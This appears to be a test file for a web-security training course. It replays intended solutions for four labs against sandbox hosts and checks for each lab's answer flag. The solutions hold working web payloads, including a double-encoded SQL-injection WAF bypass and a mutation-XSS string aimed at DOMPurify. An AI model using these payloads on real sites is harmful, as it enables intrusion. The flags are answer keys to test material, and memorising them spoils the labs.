import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the WEB labs batch B8
// (web-dom-clobbering, web-waf-bypass-advanced, web-mxss, web-http3-quic).
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-dom-clobbering', flag: 'nto{d0m_cl0bb3r1ng_us3rR0l3}', hints: 4,
    solution: [
      `curl -s 'https://target.local/profile?bio=<a id=foo>x</a>' -b 'session=me'`,
      `curl -s 'https://target.local/profile?bio=<img id=userRole>' -b 'session=me' > found.txt`,
    ],
  },
  {
    id: 'web-waf-bypass-advanced', flag: 'nto{d0ubl3_3nc0d1ng_byp4ss3s_w4f}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/search?q=test%27%20OR%201%3D1--'`,
      `curl -s 'https://shop.local/search?q=%2527%2520OR%25201%253D1--' > found.txt`,
    ],
  },
  {
    id: 'web-mxss', flag: 'nto{mxss_d0mpur1fy_2_0_0_mut4t10n}', hints: 4,
    solution: [
      `curl -s https://target.local/js/dompurify.min.js`,
      `curl -s 'https://target.local/profile?bio=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>' -b 'session=me' > found.txt`,
    ],
  },
  {
    id: 'web-http3-quic', flag: 'nto{http3_f4c4d3_d3sync_byp4ss}', hints: 4,
    solution: [
      `curl -sI --http3 https://shop.local/`,
      `curl -s --http3 https://shop.local/admin > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab B8: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
